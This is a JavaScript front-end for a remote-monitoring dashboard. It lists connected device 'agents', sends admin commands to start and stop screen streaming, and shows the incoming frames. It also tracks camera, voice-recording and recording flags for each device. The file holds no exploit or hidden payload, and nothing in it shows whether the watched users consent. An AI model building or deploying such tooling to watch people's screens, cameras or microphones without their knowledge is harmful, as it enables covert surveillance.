import { io } from 'https://cdn.socket.io/4.7.5/socket.io.esm.min.js';

const els = {
  connectionStatus: document.getElementById('connection-status'),
  controlFeedback: document.getElementById('control-feedback'),
  agentSelect: document.getElementById('agent-select'),
  agentHelper: document.getElementById('agent-helper'),
  startStream: document.getElementById('start-stream'),
  stopStream: document.getElementById('stop-stream'),
  preview: document.getElementById('stream-preview'),
  frameTimestamp: document.getElementById('frame-timestamp'),
  metaResolution: document.getElementById('meta-resolution'),
  metaAgent: document.getElementById('meta-agent'),
  metaFrameAge: document.getElementById('meta-frame-age')
};

const state = {
  socket: null,
  agents: [],
  agentState: {},
  selectedAgentId: '',
  lastFrameAt: 0
};

const apiBaseUrl = `${window.location.protocol}//${window.location.host}`;

const setStatus = (message, type = '') => {
  els.connectionStatus.textContent = message;
  els.connectionStatus.classList.remove('ok', 'error');
  if (type) {
    els.connectionStatus.classList.add(type);
  }
};

const setControlFeedback = (message, type = '') => {
  els.controlFeedback.textContent = message || '';
  els.controlFeedback.classList.remove('ok', 'warn', 'error');
  if (type) {
    els.controlFeedback.classList.add(type);
  }
};

const formatAgentOption = (agent) => {
  const status = agent.screenStreaming ? 'STREAMING' : 'IDLE';
  return `${agent.machine} (${agent.id.slice(0, 6)}) • ${status}`;
};

const updateAgentHelper = () => {
  if (!state.selectedAgentId) {
    els.agentHelper.textContent = 'Select a device to start streaming.';
    return;
  }
  const agent = state.agents.find((a) => a.id === state.selectedAgentId);
  if (!agent) {
    els.agentHelper.textContent = 'Selected device went offline. Choose another.';
    return;
  }
  const runtime = state.agentState[state.selectedAgentId];
  const streaming = runtime?.screenStreaming;
  els.agentHelper.textContent = `${agent.machine} is ${streaming ? 'currently streaming.' : 'ready.'}`;
};

const updateControlButtons = () => {
  const hasSocket = Boolean(state.socket && state.socket.connected);
  const hasSelection = Boolean(state.selectedAgentId);
  const selectedState = state.agentState[state.selectedAgentId];
  const streaming = Boolean(selectedState?.screenStreaming);

  els.startStream.disabled = !hasSocket || !hasSelection || streaming;
  els.stopStream.disabled = !hasSocket || !hasSelection || !streaming;
};

const updateAgentOptions = () => {
  const select = els.agentSelect;
  select.innerHTML = '';

  if (!state.agents.length) {
    const option = document.createElement('option');
    option.value = '';
    option.textContent = 'No devices online';
    select.appendChild(option);
    state.selectedAgentId = '';
    updateAgentHelper();
    updateControlButtons();
    return;
  }

  state.agents.forEach((agent) => {
    const option = document.createElement('option');
    option.value = agent.id;
    option.textContent = formatAgentOption(agent);
    if (agent.id === state.selectedAgentId) {
      option.selected = true;
    }
    select.appendChild(option);
  });

  if (!state.selectedAgentId || !state.agents.some((agent) => agent.id === state.selectedAgentId)) {
    state.selectedAgentId = state.agents[0].id;
    select.value = state.selectedAgentId;
  }

  updateAgentHelper();
  updateControlButtons();
};

const resetPreview = () => {
  els.preview.src = '';
  els.frameTimestamp.textContent = 'Waiting...';
  els.metaResolution.textContent = '—';
  els.metaAgent.textContent = '—';
  els.metaFrameAge.textContent = '—';
  state.lastFrameAt = 0;
};

const formatAgo = (timestamp) => {
  if (!timestamp) {
    return '—';
  }
  const diff = Math.max(0, Date.now() - timestamp);
  if (diff < 1000) {
    return 'Just now';
  }
  if (diff < 60 * 1000) {
    return `${Math.round(diff / 1000)}s ago`;
  }
  const minutes = Math.round(diff / 60000);
  return `${minutes}m ago`;
};

const updateFrameAge = () => {
  els.metaFrameAge.textContent = formatAgo(state.lastFrameAt);
};

const handleStreamFrame = (data = {}) => {
  if (!data?.image) {
    return;
  }
  if (state.selectedAgentId && data.agentId && data.agentId !== state.selectedAgentId) {
    return;
  }

  els.preview.src = `data:image/jpeg;base64,${data.image}`;
  state.lastFrameAt = Date.now();
  els.frameTimestamp.textContent = `Last frame: ${new Date(state.lastFrameAt).toLocaleTimeString()}`;
  if (data.width && data.height) {
    els.metaResolution.textContent = `${data.width}×${data.height}`;
  } else {
    els.metaResolution.textContent = 'Unknown';
  }
  if (data.machine && data.agentId) {
    els.metaAgent.textContent = `${data.machine} (${data.agentId.slice(0, 6)})`;
  }
  updateFrameAge();
};

const disconnectSocket = () => {
  if (state.socket) {
    if (typeof state.socket.removeAllListeners === 'function') {
      state.socket.removeAllListeners();
    }
    state.socket.disconnect();
    state.socket = null;
  }
  setStatus('Disconnected', 'error');
  resetPreview();
  updateControlButtons();
};

const connectSocket = () => {
  disconnectSocket();

  const socket = io(apiBaseUrl, {
    transports: ['websocket', 'polling'],
    autoConnect: false,
    reconnection: true,
    reconnectionAttempts: Infinity,
    reconnectionDelay: 1000,
    reconnectionDelayMax: 5000,
    timeout: 20000
  });
  socket.auth = { clientType: 'viewer' };
  state.socket = socket;

  socket.on('connect', () => {
    setStatus(`Connected: ${socket.id}`, 'ok');
    setControlFeedback('Connected to live stream relay.', 'ok');
    updateControlButtons();
  });

  socket.on('connect_error', (error) => {
    setStatus(`Connection error: ${error.message}`, 'error');
    setControlFeedback(`Socket error: ${error.message}`, 'error');
    updateControlButtons();
  });

  socket.on('disconnect', (reason) => {
    setStatus(`Disconnected: ${reason}`, 'error');
    setControlFeedback('Connection lost. Reconnecting...', 'warn');
    resetPreview();
    updateControlButtons();
  });

  socket.on('update_agent_list', (agents = []) => {
    state.agents = agents;
    agents.forEach((agent) => {
      state.agentState[agent.id] = {
        ...state.agentState[agent.id],
        screenStreaming: Boolean(agent.screenStreaming),
        machine: agent.machine
      };
    });
    updateAgentOptions();
  });

  socket.on('ui_agent_state', (data = {}) => {
    if (!data?.agentId) {
      return;
    }
    state.agentState[data.agentId] = {
      ...(state.agentState[data.agentId] || {}),
      recording: Boolean(data.recording),
      cameraOn: Boolean(data.cameraOn),
      voiceRecording: Boolean(data.voiceRecording),
      screenStreaming: Boolean(data.screenStreaming),
      machine: data.machine || state.agentState[data.agentId]?.machine
    };
    if (data.agentId === state.selectedAgentId) {
      updateAgentHelper();
      updateControlButtons();
    }
  });

  socket.on('ui_screen_stream_frame', handleStreamFrame);

  socket.on('ui_control_ack', (data = {}) => {
    if (!['start_screen_stream', 'stop_screen_stream'].includes(data.action)) {
      return;
    }
    if (data.ok) {
      setControlFeedback('Command delivered. Waiting for frames...', 'ok');
    } else {
      setControlFeedback('Command failed. Device may be offline.', 'warn');
    }
  });

  socket.connect();
};

const startStream = () => {
  if (!state.socket || !state.socket.connected) {
    setControlFeedback('Socket offline. Please wait...', 'warn');
    return;
  }
  if (!state.selectedAgentId) {
    setControlFeedback('Select a device first.', 'warn');
    return;
  }
  state.socket.emit('admin_start_screen_stream', { targetId: state.selectedAgentId });
  setControlFeedback('Requested live stream start...');
};

const stopStream = () => {
  if (!state.socket || !state.socket.connected) {
    setControlFeedback('Socket offline. Please wait...', 'warn');
    return;
  }
  if (!state.selectedAgentId) {
    setControlFeedback('Select a device first.', 'warn');
    return;
  }
  state.socket.emit('admin_stop_screen_stream', { targetId: state.selectedAgentId });
  setControlFeedback('Requested live stream stop...');
};

const handleAgentChange = (event) => {
  state.selectedAgentId = event.target.value;
  resetPreview();
  updateAgentHelper();
  updateControlButtons();
};

els.agentSelect.addEventListener('change', handleAgentChange);
els.startStream.addEventListener('click', startStream);
els.stopStream.addEventListener('click', stopStream);

setInterval(updateFrameAge, 1000);
setStatus('Connecting...');
connectSocket();
